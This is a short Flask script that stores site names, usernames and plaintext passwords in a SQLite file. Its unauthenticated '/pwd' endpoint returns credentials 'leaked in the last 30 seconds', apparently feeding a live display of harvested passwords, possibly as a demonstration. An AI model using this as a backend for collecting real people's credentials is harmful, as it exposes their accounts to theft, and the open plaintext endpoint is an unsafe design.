#!/usr/bin/python3

import sqlite3
from flask import Flask, render_template, jsonify

app = Flask(__name__)

DB_PATH = '/tmp/instapwd.db'

# create the db if it does not exist
with sqlite3.connect(DB_PATH) as conn:
    try:
        c = conn.cursor()
        c.execute("CREATE TABLE users(time INT PRIMARY KEY, site TEXT, username TEXT, password TEXT)")
    except sqlite3.OperationalError:
        pass

@app.route('/pwd')
def password():
    pwds = []

    with sqlite3.connect(DB_PATH) as conn:
        c = conn.cursor()
        # return creds leaked in the last 30 seconds
        c.execute("SELECT username, password FROM users WHERE strftime('%s','now')-time < 30 ORDER BY time DESC")
        if c is not None:
            pwds = c.fetchall()

    return jsonify(pwds)


@app.route('/')
def home():
    return render_template('home.html')
